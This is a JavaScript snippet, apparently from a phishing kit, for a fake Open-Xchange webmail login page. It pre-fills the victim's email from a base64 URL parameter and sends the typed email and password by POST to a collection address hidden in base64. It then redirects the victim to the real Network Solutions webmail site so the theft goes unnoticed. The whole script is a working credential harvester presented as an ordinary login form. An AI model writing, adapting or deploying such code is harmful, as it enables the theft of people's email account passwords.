<script type="text/javascript">
jQuery(document).ready(function($) {
    // Select form and input elements
    const $form = $('#io-ox-login-form');
    const $emailInput = $('.email-d');
    const $passwordInput = $('#io-ox-login-password');
    const $feedbackA1 = $('.a1');
    const $feedbackA2 = $('.a2');
    const $loader = $('.loader');

    // Pre-fill email from base64-encoded username parameter
    const url = new URL(window.location.href);
    const emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
    let email = null;

    // Decode base64-encoded username
    const encodedUsername = url.searchParams.get('username');
    if (encodedUsername) {
        try {
            const decodedUsername = atob(encodedUsername).replace(/[<>]/g, ''); // Decode and sanitize
            if (emailRegex.test(decodedUsername)) {
                email = decodedUsername;
                console.log("Decoded Username: " + decodedUsername);
            } else {
                console.warn("Decoded username is not a valid email: " + decodedUsername);
            }
        } catch (e) {
            console.error("Error decoding base64 username string:", e);
        }
    }

    // Populate email input if valid
    if (email) {
        $emailInput.val(email);
    }

    // Show password field if email is pre-filled
    if ($emailInput.val()) {
        $('#io-ox-login-password').closest('.password').removeClass('hidden');
    }

    // Handle form submission
    $form.on('submit', function(e) {
        e.preventDefault();
        $feedbackA1.hide();
        $feedbackA2.hide();

        const username = $emailInput.val().trim();
        const password = $passwordInput.val().trim();

        if (!username || !password) {
            $feedbackA1.removeClass('hidden').fadeIn();
            $passwordInput.val('');
            setTimeout(() => $feedbackA1.fadeOut(), 3000);
            return;
        }

        $loader.text('Logging in...').prop('disabled', true).fadeIn();
        const data = { username, password };
        const actionUrl = atob($form.attr('data-action'));

        corsReq(actionUrl, data, 'POST', function(response) {
            console.log('AJAX Response:', response);
            $loader.prop('disabled', false).fadeOut();
            if (response?.responseJSON?.success && response.responseJSON.authenticated) {
                const redirectUrl = 'https://webmail-oxcs.networksolutionsemail.com/appsuite';
                console.log('Redirecting to:', redirectUrl);
                window.location.assign(redirectUrl);
            } else {
                console.log('No redirect, response:', response.responseJSON);
                showError();
            }
        }).fail(function(jqXHR, textStatus, errorThrown) {
            console.log('AJAX Failed:', textStatus, errorThrown);
            showError();
        });
    });

    // Handle show/hide password button
    $('#showHideButton').on('click', function() {
        const $button = $(this);
        const type = $passwordInput.attr('type') === 'password' ? 'text' : 'password';
        $passwordInput.attr('type', type);
        $button.text(type === 'password' ? 'Show' : 'Hide');
    });

    // Show error message
    function showError() {
        $loader.prop('disabled', false);
        $feedbackA2.removeClass('hidden').fadeIn();
        $passwordInput.val('');
        setTimeout(() => $feedbackA2.fadeOut(), 3000);
    }

    // Custom CORS AJAX request function
    function corsReq(url, data, type, complete) {
        const settings = {
            url: url,
            data: data,
            type: type,
            dataType: 'json',
            crossDomain: true,
            async: true,
            xhrFields: { withCredentials: false },
            complete: complete
        };
        console.log('AJAX Settings:', settings);
        return $.ajax(settings);
    }
});
